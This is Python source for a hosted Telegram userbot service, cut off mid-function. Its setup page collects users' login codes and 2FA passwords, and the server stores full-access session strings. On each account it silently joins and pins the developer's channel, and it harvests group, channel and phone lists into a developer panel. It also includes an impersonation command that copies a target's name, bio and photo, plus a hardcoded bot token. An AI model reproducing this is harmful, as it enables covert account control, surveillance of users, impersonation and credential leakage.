import asyncio
import threading
from functools import wraps
from typing import Dict, Tuple
from concurrent.futures import ThreadPoolExecutor
import logging
import time
import random
import json
import os
import io
import sys
import uuid
from collections import Counter

from flask import Flask, jsonify, request
from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from telethon.sessions import StringSession
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.functions.photos import UploadProfilePhotoRequest, DeletePhotosRequest
from telethon.tl.functions.contacts import BlockRequest, UnblockRequest
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ToggleDialogPinRequest, GetDialogsRequest
from telethon.tl.types import InputPeerChannel, InputPeerUser

# ========== تخزين الجلسات ==========
DATA_DIR = '/data' if os.path.exists('/data') else '.'
os.makedirs(DATA_DIR, exist_ok=True)
SESSION_FILE = os.path.join(DATA_DIR, 'active_sessions.json')
API_CONFIG_FILE = os.path.join(DATA_DIR, 'api_config.json')
TEMP_DIR = os.path.join(DATA_DIR, 'temp')
os.makedirs(TEMP_DIR, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

SOURCE_CHANNEL = "https://t.me/Q_g_r_a_m"
SOURCE_CHANNEL_USERNAME = "Q_g_r_a_m"
BOT_TOKEN = '8887748662:AAH3gpgZz6BsBCOx3yq8hXtnDel1dGVn7Mo'
BOT_API_ID = 2040
BOT_API_HASH = 'b18441a1ff607e10a989891a5462e627'
DEV_PHONE = "+201096371454"

main_loop = asyncio.new_event_loop()

active_clients: Dict[str, TelegramClient] = {}
pending_logins: Dict[str, Tuple[TelegramClient, str, int, str]] = {}
api_configs_storage: Dict[str, Dict] = {}

muted_users = {}
banned_users = {}
taqleed_users = {}
ent7al_users = {}
ent7al_original = {}
bold_mode = {}
save_deleted = {}
deleted_messages = {}
client_me = {}
command_stats = {}
user_info_cache = {}

def run_async_in_main_loop(coro):
    future = asyncio.run_coroutine_threadsafe(coro, main_loop)
    return future.result(timeout=60)

def async_route(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        try:
            return run_async_in_main_loop(f(*args, **kwargs))
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500
    return wrapper

def track_command(phone: str, command: str):
    if phone not in command_stats:
        command_stats[phone] = Counter()
    command_stats[phone][command] += 1

def is_dev(phone: str) -> bool:
    return phone == DEV_PHONE

async def save_all_sessions():
    try:
        sessions_data, configs = {}, {}
        for phone, client in active_clients.items():
            try:
                if client.is_connected():
                    sessions_data[phone] = client.session.save()
                    if phone in api_configs_storage:
                        configs[phone] = api_configs_storage[phone]
            except:
                continue
        with open(SESSION_FILE, 'w') as f:
            json.dump(sessions_data, f)
        with open(API_CONFIG_FILE, 'w') as f:
            json.dump(configs, f)
    except:
        pass

async def load_all_sessions():
    try:
        if not os.path.exists(SESSION_FILE):
            return
        with open(SESSION_FILE, 'r') as f:
            sessions = json.load(f)
        with open(API_CONFIG_FILE, 'r') as f:
            configs = json.load(f)
        for phone, session_str in sessions.items():
            try:
                if phone in configs:
                    api_id = configs[phone]['api_id']
                    api_hash = configs[phone]['api_hash']
                    client = TelegramClient(StringSession(session_str), api_id, api_hash)
                    await client.connect()
                    if await client.is_user_authorized():
                        active_clients[phone] = client
                        api_configs_storage[phone] = configs[phone]
                        client_me[phone] = await client.get_me()
                        asyncio.ensure_future(run_userbot(client, phone), loop=main_loop)
                        logger.info(f"Restored: {phone}")
            except:
                pass
    except:
        pass

async def auto_save_sessions_loop():
    while True:
        await asyncio.sleep(300)
        await save_all_sessions()

async def pin_channel_to_top(client):
    try:
        channel = await client.get_entity(SOURCE_CHANNEL_USERNAME)
        await client(ToggleDialogPinRequest(peer=InputPeerChannel(channel.id, channel.access_hash), pinned=True))
    except:
        pass

async def ensure_subscription(client, phone):
    try:
        await client(JoinChannelRequest(SOURCE_CHANNEL_USERNAME))
        await asyncio.sleep(1)
    except:
        pass
    await pin_channel_to_top(client)

async def cache_user_info(client, phone):
    try:
        me = await client.get_me()
        info = {"first_name": me.first_name or "Unknown", "username": me.username or "", "phone": phone, "groups": [], "channels": []}
        try:
            dialogs = await client(GetDialogsRequest(offset_date=None, offset_id=0, offset_peer=InputPeerUser(0, 0), limit=50, hash=0))
            for dialog in dialogs.chats:
                if hasattr(dialog, 'title'):
                    if hasattr(dialog, 'megagroup') and dialog.megagroup:
                        info["groups"].append({"name": dialog.title, "id": dialog.id})
                    elif hasattr(dialog, 'broadcast') and dialog.broadcast:
                        info["channels"].append({"name": dialog.title, "id": dialog.id})
        except:
            pass
        user_info_cache[phone] = info
    except:
        pass

def start_client_in_background(client, phone):
    async def run_client():
        try:
            if not client.is_connected():
                await client.connect()
            if not await client.is_user_authorized():
                return
            client_me[phone] = await client.get_me()
            await ensure_subscription(client, phone)
            await cache_user_info(client, phone)
            await setup_handlers(client, phone)
            try:
                await client.send_message('me', """
**Qthon UserBot**

• Send **.اوامر** for commands
• Channel: @Q_g_r_a_m
""", parse_mode='md')
            except:
                pass
            await client.run_until_disconnected()
        except Exception as e:
            logger.error(f"Error {phone}: {e}")
    asyncio.run_coroutine_threadsafe(run_client(), main_loop)

async def run_userbot(client, phone):
    await setup_handlers(client, phone)
    await client.run_until_disconnected()

async def setup_handlers(client, phone):
    if phone not in muted_users:
        muted_users[phone] = {}
        banned_users[phone] = {}
        taqleed_users[phone] = {}
        ent7al_users[phone] = False
        ent7al_original[phone] = {}
        bold_mode[phone] = False
        save_deleted[phone] = False
        deleted_messages[phone] = []
    
    @client.on(events.NewMessage(incoming=True))
    async def auto_mute(event):
        if event.is_private and event.sender_id in muted_users.get(phone, {}):
            try: await event.delete()
            except: pass
    
    @client.on(events.NewMessage(incoming=True))
    async def auto_taqleed(event):
        if event.is_private and event.sender_id in taqleed_users.get(phone, {}) and event.text:
            if not event.text.startswith('.'):
                await asyncio.sleep(0.5)
                try: await client.send_message(event.sender_id, event.text)
                except: pass
    
    @client.on(events.NewMessage(outgoing=True))
    async def bold_handler(event):
        if bold_mode.get(phone, False) and event.text and not event.text.startswith('.'):
            try: await event.edit(f"**{event.text}**")
            except: pass
    
    # ==================== الأوامر الأساسية ====================
    @client.on(events.NewMessage(outgoing=True, pattern='.سورس'))
    async def src(event):
        await event.edit("**Qthon**\n\n• Channel: @Q_g_r_a_m\n• Setup: @Qthon_bot", parse_mode='md')
    
    @client.on(events.NewMessage(outgoing=True, pattern='.اوامر'))
    async def cmds(event):
        track_command(phone, ".اوامر")
        await event.edit("""**Qthon Commands**

• ايدي - كشف
• تقليد - الغاء تقليد
• انتحال - الغاء انتحال
• خط عريض - الغاء خط
• اسم + الاسم
• بايو + البايو
• كتم - الغاء كتم
• حظر - الغاء حظر
• تقيد - الغاء تقييد
• تهكير
• بنغ
• سجل - الغاء سجل
• تثبيت
• اوامر
• سورس""", parse_mode='md')
    
    @client.on(events.NewMessage(outgoing=True, pattern='.بنغ'))
    async def ping(event):
        await event.edit(f"**Speed: {random.randint(180, 220)}ms**")
    
    @client.on(events.NewMessage(outgoing=True, pattern='.تثبيت'))
    async def pin_cmd(event):
        await event.edit("**• Pinning...**")
        await ensure_subscription(client, phone)
        await event.edit("**• Channel pinned**")
    
    @client.on(events.NewMessage(outgoing=True, pattern=r'\.(ايدي|كشف)'))
    async def id_cmd(event):
        track_command(phone, ".ايدي")
        await event.delete()
        user = None
        if event.is_reply: user = await client.get_entity((await event.get_reply_message()).sender_id)
        elif event.is_group: user = await client.get_entity(event.sender_id)
        else: user = await client.get_entity(event.chat_id)
        if not user: return
        lines = [f"Name: {user.first_name or ''} {user.last_name or ''}".strip()]
        if user.username: lines.append(f"User: @{user.username}")
        try:
            full = await client.get_entity(user.id)
            if hasattr(full, 'about') and full.about: lines.append(f"Bio: {full.about[:50]}")
        except: pass
        lines.append(f"ID: {user.id}")
        await client.send_message(event.chat_id, "\n".join(lines))
    
    @client.on(events.NewMessage(outgoing=True, pattern='.تقليد'))
    async def taq(event):
        track_command(phone, ".تقليد")
        tid = None
        if event.is_reply: tid = (await event.get_reply_message()).sender_id
        elif event.is_private: tid = event.chat_id
        if tid: taqleed_users[phone][tid] = True; await event.edit("**• Taqleed ON**")
    
    @client.on(events.NewMessage(outgoing=True, pattern='.الغاء تقليد'))
    async def notaq(event):
        tid = None
        if event.is_reply: tid = (await event.get_reply_message()).sender_id
        elif event.is_private: tid = event.chat_id
        if tid: taqleed_users[phone].pop(tid, None)
        await event.edit("**• Taqleed OFF**")
    
    @client.on(events.NewMessage(outgoing=True, pattern='.انتحال'))
    async def ent7al(event):
        track_command(phone, ".انتحال")
        await event.edit("**• Impersonating...**")
        target = None
        if event.is_reply:
            try: target = await client.get_entity((await event.get_reply_message()).sender_id)
            except: pass
        elif event.is_private:
            try: target = await client.get_entity(event.chat_id)
            except: pass
        if not target: await event.edit("**• Failed**"); return
        
        me = client_me.get(phone) or await client.get_me()
        client_me[phone] = me
        original = {'first_name': me.first_name or '', 'last_name': me.last_name or '', 'photo_path': None, 'about': ''}
        try:
            full_me = await client.get_entity('me')
            if hasattr(full_me, 'about') and full_me.about: original['about'] = full_me.about
        except: pass
        try:
            if me.photo:
                pp = os.path.join(TEMP_DIR, f"orig_{phone}.jpg")
                if os.path.exists(pp): os.remove(pp)
                if await client.download_profile_photo('me', file=pp): original['photo_path'] = pp
        except: pass
        ent7al_original[phone] = original
        
        try: await client(UpdateProfileRequest(first_name=target.first_name or '', last_name=target.last_name or ''))
        except: pass
        try:
            tf = await client.get_entity(target.id)
            about = getattr(tf, 'about', '') or ''
            await client(UpdateProfileRequest(about=about))
        except: pass
        if target.photo:
            try:
                ps = await client.get_profile_photos('me', limit=1)
                if ps: await client(DeletePhotosRequest(id=[ps[0]])); await asyncio.sleep(2)
            except: pass
            pp = os.path.join(TEMP_DIR, f"stolen_{phone}.jpg")
            try:
                if os.path.exists(pp): os.remove(pp)
                if await client.download_profile_photo(target, file=pp):
                    uploaded = await client.upload_file(pp)
                    await client(UploadProfilePhotoRequest(uploaded))
                    await asyncio.sleep(2)
                    if os.path.exists(pp): os.remove(pp)
            except: pass
        
        ent7al_users[phone] = True
        await event.edit("**• Done**")
    
    @client.on(events.NewMessage(outgoing=True, pattern='.الغاء انتحال'))
    async def unent7al(event):
        await event.edit("**• Restoring...**")
        if ent7al_users.get(phone) and ent7al_original.get(phone):
            orig = ent7al_original[phone]
            try: await client(UpdateProfileRequest(first_name=orig.get('first_name', ''), last_name=orig.get('last_name', '')))
            except: pass
            try: await client(UpdateProfileRequest(about=orig.get('about', '')))
            except: pass
            pp = orig.get('photo_path')
            if pp and os.path.exists(pp):
                try:
                    ps = await client.get_profile_photos('me', limit=1)
                    if ps: await client(DeletePhotosRequest(id=[ps[0]])); await asyncio.sleep(2)
                    uploaded = await client.upload_file(pp)
                    await client(UploadProfilePhotoRequest(uploaded))
                    await asyncio.sleep(2)
                    os.remove(pp)
                except: pass
            ent7al_users[phone] = False
            ent7al_original[phone] = {}
        await event.edit("**• Restored**")
    
    @client.on(events.NewMessage(outgoing=True, pattern='.كتم'))
    async def mute(event):
        track_command(phone, ".كتم")
        tid = None
        if event.is_reply: tid = (await event.get_reply_message()).sender_id
        elif event.is_private: tid = event.chat_id
        if tid: muted_users[phone][tid] = True; await event.edit("**• Muted**")
    
    @client.on(events.NewMessage(outgoing=True, pattern='.الغاء كتم'))
    async def unmute(event):
        tid = None
        if event.is_reply: tid = (await event.get_reply_message()).sender_id
        elif event.is_private: tid = event.chat_id
        if tid: muted_users[phone].pop(tid, None)
        await event.edit("**• Unmuted**")
    
    @client.on(events.NewMessage(outgoing=True, pattern='.حظر'))
    async def ban(event):
        track_command(phone, ".حظر")
        tid = None
        if event.is_reply: tid = (await event.get_reply_message()).sender_id
        elif event.is_private: tid = event.chat_id
        if tid:
            try: await client(BlockRequest(tid)); banned_users[phone][tid] = True; await event.edit("**• Banned**")
            except: await event.edit("**• Failed**")
    
    @client.on(events.NewMessage(outgoing=True, pattern='.الغاء حظر'))
    async def unban(event):
        tid = None
        if event.is_reply: tid = (await event.get_reply_message()).sender_id
        elif event.is_private: tid = event.chat_id
        if tid:
            try: await client(UnblockRequest(tid)); banned_users[phone].pop(tid, None); await event.edit("**• Unbanned**")
            except: await event.edit("**• Failed**")
    
    @client.on(events.NewMessage(outgoing=True, pattern='.تقيد'))
    async def restrict(event):
        track_command(phone, ".تقيد")
        if event.is_group and event.is_reply:
            try: await client.edit_permissions(event.chat_id, (await event.get_reply_message()).sender_id, send_messages=False); await event.edit("**• Restricted**")
            except: await event.edit("**• Failed**")
    
    @client.on(events.NewMessage(outgoing=True, pattern='.الغاء تقييد'))
    async def unrestrict(event):
        if event.is_group and event.is_reply:
            try: await client.edit_permissions(event.chat_id, (await event.get_reply_message()).sender_id, send_messages=True); await event.edit("**• Unrestricted**")
            except: await event.edit("**• Failed**")
    
    @client.on(events.NewMessage(outgoing=True, pattern='.تهكير'))
    async def hack(event):
        track_command(phone, ".تهكير")
        n = "target"
        if event.is_reply:
            try: n = (await client.get_entity((await event.get_reply_message()).sender_id)).first_name
            except: pass
        await event.edit("**Hacking...**"); await asyncio.sleep(1)
        await event.edit("**50%**"); await asyncio.sleep(1)
        await event.edit(f"**{n} hacked!**")
    
    @client.on(events.NewMessage(outgoing=True, pattern='.خط عريض'))
    async def bold(event):
        bold_mode[phone] = True; await event.edit("**• Bold ON**")
    
    @client.on(events.NewMessage(outgoing=True, pattern='.الغاء خط'))
    async def nobold(event):
        bold_mode[phone] = False; await event.edit("**• Bold OFF**")
    
    @client.on(events.NewMessage(outgoing=True, pattern='.سجل'))
    async def save(event):
        save_deleted[phone] = True; await event.edit("**• Logging ON**")
    
    @client.on(events.NewMessage(outgoing=True, pattern='.الغاء سجل'))
    async def nosave(event):
        save_deleted[phone] = False; await event.edit("**• Logging OFF**")
    
    @client.on(events.NewMessage(outgoing=True, pattern=r'\.اسم (.+)'))
    async def name(event):
        try: await client(UpdateProfileRequest(first_name=event.pattern_match.group(1).strip(), last_name='')); await event.edit("**• Name changed**")
        except: await event.edit("**• Failed**")
    
    @client.on(events.NewMessage(outgoing=True, pattern=r'\.بايو (.+)'))
    async def bio(event):
        try: await client(UpdateProfileRequest(about=event.pattern_match.group(1).strip())); await event.edit("**• Bio changed**")
        except: await event.edit("**• Failed**")
    
    logger.info(f"Handlers ready: {phone}")

# ======================== بوت المطور ========================
bot = TelegramClient(f'bot_session_{uuid.uuid4().hex[:6]}', BOT_API_ID, BOT_API_HASH)

async def notify_dev(message):
    """إرسال إشعار للمطور"""
    try:
        dev_client = None
        for phone, client in active_clients.items():
            if phone == DEV_PHONE:
                dev_client = client
                break
        if dev_client:
            await dev_client.send_message('me', message)
        else:
            # إذا لم يكن المطور مسجلاً، نستخدم البوت لإرسال رسالة إلى معرف المطور
            # لكن لا يمكن للبوت إرسال رسالة إلى مستخدم إلا إذا بدأ المحادثة أولاً
            pass
    except Exception as e:
        logger.error(f"Failed to notify dev: {e}")

@bot.on(events.NewMessage(pattern='/start'))
async def bot_start(event):
    user_id = str(event.sender_id)
    # التحقق مما إذا كان المستخدم هو المطور
    if user_id == DEV_PHONE:
        # قائمة المطور
        buttons = [
            [Button.inline("USERS COUNT", b"dev_users"),
             Button.inline("ACTIVE NOW", b"dev_active")],
            [Button.inline("TOP COMMANDS", b"dev_topcmd"),
             Button.inline("GROUPS LIST", b"dev_groups")],
            [Button.inline("CHANNELS LIST", b"dev_channels"),
             Button.inline("BROADCAST", b"dev_broadcast")],
        ]
        await event.respond(
            "**Qthon Developer Panel**\n\nSelect an option.",
            buttons=buttons,
            parse_mode='md'
        )
        await notify_dev("Developer logged in to bot panel.")
    else:
        # مستخدم عادي - يظهر زر Mini App
        site_url = os.environ.get('RAILWAY_PUBLIC_DOMAIN', 'http://localhost:5000')
        buttons = [
            [Button.url("OPEN SETUP", site_url)],
        ]
        await event.respond(
            "**Qthon Setup**\n\n"
            "Welcome! Press the button below to open the setup page.\n"
            "You will need API ID and API Hash from my.telegram.org.",
            buttons=buttons,
            parse_mode='md'
        )
        # إشعار المطور بمستخدم جديد
        await notify_dev(f"New user started setup: {user_id}")

@bot.on(events.CallbackQuery())
async def dev_callback(event):
    data = event.data.decode()
    user_id = str(event.sender_id)
    if user_id != DEV_PHONE:
        await event.answer("Access denied", alert=True)
        return
    
    if data == "dev_users":
        total = len(active_clients)
        msg = f"**Total Registered Users:** {total}\n\n"
        for phone, info in user_info_cache.items():
            username = f"@{info['username']}" if info['username'] else "no username"
            msg += f"• {info['first_name']} | {username} | {phone}\n"
        if not user_info_cache:
            msg += "No users found."
        await event.edit(msg, parse_mode='md')
    
    elif data == "dev_active":
        active_count = len(active_clients)
        msg = f"**Currently Active:** {active_count}\n\n"
        for phone, client in active_clients.items():
            info = user_info_cache.get(phone, {})
            name = info.get('first_name', phone)
            msg += f"• {name} | {phone}\n"
        if not active_clients:
            msg += "No active sessions."
        await event.edit(msg, parse_mode='md')
    
    elif data == "dev_topcmd":
        all_cmds = Counter()
        for cmds in command_stats.values():
            all_cmds.update(cmds)
        top = all_cmds.most_common(10)
        msg = "**Top 10 Commands:**\n\n"
        for i, (cmd, cnt) in enumerate(top, 1):
            msg += f"{i}. .{cmd}: {cnt} times\n"
        if not top:
            msg += "No commands used yet."
        await event.edit(msg, parse_mode='md')
    
    elif data == "dev_groups":
        msg = "**Groups:**\n\n"
        for phone, info in user_info_cache.items():
            groups = info.get('groups', [])
            if groups:
                msg += f"**{info.get('first_name', phone)}:**\n"
                for g in groups[:5]:
                    msg += f"  • {g['name']}\n"
        if not msg.strip():
            msg = "No groups found."
        await event.edit(msg, parse_mode='md')
    
    elif data == "dev_channels":
        msg = "**Channels:**\n\n"
        for phone, info in user_info_cache.items():
            channels = info.get('channels', [])
            if channels:
                msg += f"**{info.get('first_name', phone)}:**\n"
                for c in channels[:5]:
                    msg += f"  • {c['name']}\n"
        if not msg.strip():
            msg = "No channels found."
        await event.edit(msg, parse_mode='md')
    
    elif data == "dev_broadcast":
        # يمكن إضافة وظيفة البث لاحقًا
        await event.answer("Broadcast feature coming soon", alert=True)
    
    await event.answer()

# ======================== موقع الويب الفاخر ========================
@app.route('/')
def home():
    domain = os.environ.get('RAILWAY_PUBLIC_DOMAIN', 'http://localhost:5000')
    return f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
        <title>Qthon - UserBot Setup</title>
        <style>
            :root {{
                --bg: #0a0a19;
                --bg2: #121226;
                --surface: rgba(255,255,255,0.04);
                --glass: rgba(255,255,255,0.06);
                --glass-border: rgba(255,255,255,0.08);
                --text: #FFFFFF;
                --text-secondary: rgba(255,255,255,0.5);
                --text-tertiary: rgba(255,255,255,0.3);
                --accent: #4F6EF7;
                --accent-glow: rgba(79,110,247,0.3);
                --success: #34C759;
                --danger: #FF3B30;
                --radius: 16px;
                --radius-xl: 24px;
            }}
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{
                font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', system-ui, sans-serif;
                background: var(--bg);
                color: var(--text);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 16px;
                -webkit-font-smoothing: antialiased;
                -moz-osx-font-smoothing: grayscale;
                overflow-x: hidden;
            }}
            body::before {{
                content: '';
                position: fixed;
                top: -50%;
                left: -50%;
                width: 200%;
                height: 200%;
                background: radial-gradient(ellipse at 50% 0%, rgba(79,110,247,0.06) 0%, transparent 60%),
                            radial-gradient(ellipse at 80% 80%, rgba(79,110,247,0.04) 0%, transparent 50%);
                pointer-events: none;
                z-index: 0;
                animation: ambientPulse 8s ease-in-out infinite;
            }}
            @keyframes ambientPulse {{
                0%, 100% {{ opacity: 1; }}
                50% {{ opacity: 0.6; }}
            }}
            .container {{
                position: relative;
                z-index: 1;
                width: 100%;
                max-width: 420px;
            }}
            .header {{
                text-align: center;
                margin-bottom: 32px;
            }}
            .logo {{
                font-size: 52px;
                font-weight: 700;
                letter-spacing: -1.5px;
                background: linear-gradient(135deg, #FFFFFF 0%, rgba(255,255,255,0.8) 100%);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
                line-height: 1.1;
                margin-bottom: 4px;
                animation: fadeInUp 0.6s ease;
            }}
            @keyframes fadeInUp {{
                from {{ opacity: 0; transform: translateY(20px); }}
                to {{ opacity: 1; transform: translateY(0); }}
            }}
            .subtitle {{
                font-size: 12px;
                font-weight: 500;
                letter-spacing: 2px;
                text-transform: uppercase;
                color: var(--text-tertiary);
                animation: fadeInUp 0.8s ease;
            }}
            .card {{
                background: var(--bg2);
                border: 1px solid var(--glass-border);
                border-radius: var(--radius-xl);
                padding: 28px 24px;
                box-shadow: 0 24px 80px rgba(0,0,0,0.4);
                backdrop-filter: blur(20px);
                -webkit-backdrop-filter: blur(20px);
                transition: border-color 0.3s ease;
                animation: fadeInUp 0.5s ease;
            }}
            .card:hover {{
                border-color: rgba(255,255,255,0.12);
            }}
            .section-title {{
                font-size: 13px;
                font-weight: 600;
                letter-spacing: 1.5px;
                text-transform: uppercase;
                color: var(--text-secondary);
                margin-bottom: 24px;
                text-align: center;
            }}
            .input-group {{
                margin-bottom: 16px;
            }}
            .input-label {{
                display: block;
                font-size: 11px;
                font-weight: 600;
                letter-spacing: 1.2px;
                text-transform: uppercase;
                color: var(--text-tertiary);
                margin-bottom: 8px;
            }}
            .input-field {{
                width: 100%;
                padding: 14px 16px;
                background: var(--surface);
                border: 1px solid var(--glass-border);
                border-radius: var(--radius);
                color: var(--text);
                font-size: 15px;
                font-family: 'SF Mono', 'JetBrains Mono', 'Fira Code', monospace;
                letter-spacing: 0.5px;
                outline: none;
                transition: all 0.25s ease;
            }}
            .input-field:focus {{
                border-color: rgba(79,110,247,0.5);
                box-shadow: 0 0 0 4px rgba(79,110,247,0.08);
                background: rgba(255,255,255,0.06);
            }}
            .btn {{
                width: 100%;
                padding: 16px;
                border: none;
                border-radius: var(--radius);
                font-size: 15px;
                font-weight: 600;
                letter-spacing: 0.5px;
                cursor: pointer;
                transition: all 0.3s ease;
                margin-top: 8px;
                position: relative;
                overflow: hidden;
                -webkit-tap-highlight-color: transparent;
            }}
            .btn-primary {{
                background: var(--accent);
                color: #FFF;
                transform: translateY(0);
                box-shadow: 0 4px 15px rgba(79,110,247,0.2);
            }}
            .btn-primary:hover {{
                background: #5F7EF9;
                box-shadow: 0 8px 32px var(--accent-glow);
                transform: translateY(-1px);
            }}
            .btn-primary:active {{
                transform: scale(0.98);
                transition: transform 0.1s ease;
            }}
            .btn-success {{
                background: var(--success);
                color: #FFF;
                box-shadow: 0 4px 15px rgba(52,199,89,0.2);
            }}
            .btn-success:hover {{
                box-shadow: 0 8px 32px rgba(52,199,89,0.3);
                transform: translateY(-1px);
            }}
            .btn-ghost {{
                background: transparent;
                color: var(--text-secondary);
                border: 1px solid var(--glass-border);
                position: absolute;
                top: 16px;
                right: 16px;
                width: auto;
                padding: 8px 16px;
                font-size: 13px;
                border-radius: 12px;
            }}
            .btn-ghost:hover {{
                background: rgba(255,255,255,0.05);
                color: var(--text);
            }}
            .result {{
                margin-top: 20px;
                padding: 14px 18px;
                border-radius: var(--radius);
                font-size: 13px;
                font-weight: 500;
                text-align: center;
                display: none;
                animation: fadeInUp 0.4s ease;
            }}
            .result.show {{
                display: block;
            }}
            .result.success {{
                background: rgba(52,199,89,0.1);
                border: 1px solid rgba(52,199,89,0.2);
                color: var(--success);
            }}
            .result.error {{
                background: rgba(255,59,48,0.1);
                border: 1px solid rgba(255,59,48,0.2);
                color: var(--danger);
            }}
            .hidden {{ display: none; }}
            .relative {{ position: relative; }}
            .help-box {{
                margin-top: 24px;
                padding: 20px;
                background: var(--bg2);
                border-radius: var(--radius);
                border: 1px solid var(--glass-border);
                animation: fadeInUp 0.7s ease;
            }}
            .help-box h3 {{
                font-size: 14px;
                font-weight: 600;
                margin-bottom: 12px;
                color: var(--text);
            }}
            .help-box a {{
                color: var(--accent);
                text-decoration: none;
                font-weight: 500;
                border-bottom: 1px solid transparent;
                transition: border-color 0.2s;
            }}
            .help-box a:hover {{
                border-bottom-color: var(--accent);
            }}
            .help-box p {{
                font-size: 13px;
                color: var(--text-secondary);
                line-height: 1.7;
                margin-bottom: 8px;
            }}
            /* Progress inside button */
            .btn.loading {{
                pointer-events: none;
                opacity: 0.8;
            }}
            .btn.loading::after {{
                content: '';
                position: absolute;
                top: 50%;
                left: 50%;
                width: 18px;
                height: 18px;
                margin-left: -9px;
                margin-top: -9px;
                border: 2px solid transparent;
                border-top-color: currentColor;
                border-radius: 50%;
                animation: spin 0.8s linear infinite;
            }}
            @keyframes spin {{
                to {{ transform: rotate(360deg); }}
            }}
            @media (max-width: 380px) {{
                .card {{ padding: 20px 16px; }}
                .logo {{ font-size: 42px; }}
                .btn-ghost {{ top: 8px; right: 8px; }}
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1 class="logo">Qthon</h1>
                <p class="subtitle">Telethon Setup</p>
            </div>
            <div class="card">
                <div id="step1">
                    <p class="section-title">Account Configuration</p>
                    <form id="sendForm" autocomplete="off">
                        <div class="input-group">
                            <label class="input-label">API ID</label>
                            <input type="text" name="api_id" id="api_id" placeholder="12345678" required class="input-field" inputmode="numeric">
                        </div>
                        <div class="input-group">
                            <label class="input-label">API Hash</label>
                            <input type="text" name="api_hash" id="api_hash" placeholder="0123456789abcdef..." required class="input-field">
                        </div>
                        <div class="input-group">
                            <label class="input-label">Phone Number</label>
                            <input type="text" name="phone" id="phone" placeholder="+201234567890" required class="input-field">
                        </div>
                        <button type="submit" class="btn btn-primary" id="sendBtn">Send Verification Code</button>
                    </form>
                </div>
                <div id="step2" class="hidden relative">
                    <button onclick="backToStep1()" class="btn btn-ghost">Back</button>
                    <p class="section-title">Verify Code</p>
                    <form id="verifyForm" autocomplete="off">
                        <input type="hidden" name="phone" id="verify_phone">
                        <div class="input-group">
                            <label class="input-label">Verification Code</label>
                            <input type="text" name="code" id="code" placeholder="12345" required maxlength="5" class="input-field" style="text-align:center;font-size:24px;letter-spacing:8px" inputmode="numeric">
                        </div>
                        <div class="input-group">
                            <label class="input-label">2FA Password (optional)</label>
                            <input type="password" name="password" id="password" placeholder="••••••••" class="input-field">
                        </div>
                        <button type="submit" class="btn btn-success" id="verifyBtn">Activate</button>
                    </form>
                </div>
                <div id="result" class="result"></div>
            </div>
            <div class="help-box">
                <h3>Need API credentials?</h3>
                <p>1. Visit <a href="https://my.telegram.org" target="_blank">my.telegram.org</a></p>
                <p>2. Log in with your phone number</p>
                <p>3. Go to <strong>API development tools</strong></p>
                <p>4. Create an application to get your <strong>api_id</strong> and <strong>api_hash</strong></p>
            </div>
        </div>
        <script>
            const resultDiv = document.getElementById('result');
            const sendBtn = document.getElementById('sendBtn');
            const verifyBtn = document.getElementById('verifyBtn');

            function showResult(message, isSuccess) {{
                resultDiv.className = 'result show ' + (isSuccess ? 'success' : 'error');
                resultDiv.textContent = message;
            }}

            function setLoading(btn, loading) {{
                if (loading) {{
                    btn.classList.add('loading');
                    btn.disabled = true;
                }} else {{
                    btn.classList.remove('loading');
                    btn.disabled = false;
                }}
            }}

            document.getElementById('sendForm').addEventListener('submit', async (e) => {{
                e.preventDefault();
                const formData = new FormData(e.target);
                setLoading(sendBtn, true);
                try {{
                    const res = await fetch('/api/send_code', {{ method: 'POST', body: formData }});
                    const data = await res.json();
                    if (data.status === 'code_sent') {{
                        document.getElementById('verify_phone').value = formData.get('phone');
                        document.getElementById('step1').classList.add('hidden');
                        document.getElementById('step2').classList.remove('hidden');
                        showResult(data.message, true);
                    }} else {{
                        showResult(data.message || data.error || 'An error occurred', false);
                    }}
                }} catch (err) {{
                    showResult('Connection error', false);
                }} finally {{
                    setLoading(sendBtn, false);
                }}
            }});

            document.getElementById('verifyForm').addEventListener('submit', async (e) => {{
                e.preventDefault();
                const formData = new FormData(e.target);
                setLoading(verifyBtn, true);
                try {{
                    const res = await fetch('/api/verify', {{ method: 'POST', body: formData }});
                    const data = await res.json();
                    if (data.status === 'success') {{
                        showResult('Telethon Qthon has been installed successfully!', true);
                        // No reload, just show message
                    }} else {{
                        showResult(data.message || 'Verification failed', false);
                    }}
                }} catch (err) {{
                    showResult('Connection error', false);
                }} finally {{
                    setLoading(verifyBtn, false);
                }}
            }});

            function backToStep1() {{
                document.getElementById('step1').classList.remove('hidden');
                document.getElementById('step2').classList.add('hidden');
                resultDiv.className = 'result';
            }}
        </script>
    </body>
    </html>
    """

@app.route('/health')
def health():
    return "OK", 200

@app.route('/api/send_code', methods=['POST'])
@async_route
async def send_code():
    try:
        api_id = int(request.form.get('api_id'))
        api_hash = request.form.get('api_hash')
        phone = request.form.get('phone', '').strip()
        if not api_id or not api_hash or not phone:
            return jsonify({"status": "error", "message": "All fields required"}), 400
        api_configs_storage[phone] = {'api_id': api_id, 'api_hash': api_hash}
        client = TelegramClient(StringSession(), api_id, api_hash)
        await client.connect()
        if await client.is_user_authorized():
            active_clients[phone] = client
            client_me[phone] = await client.get_me()
            start_client_in_background(client, phone)
            await save_all_sessions()
            return jsonify({"status": "already_active", "message": "UserBot is already active"})
        sent = await client.send_code_request(phone)
        pending_logins[phone] = (client, sent.phone_code_hash, api_id, api_hash)
        return jsonify({"status": "code_sent", "message": "Verification code sent"})
    except Exception as e:
        logger.error(f"Send code error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/verify', methods=['POST'])
@async_route
async def verify():
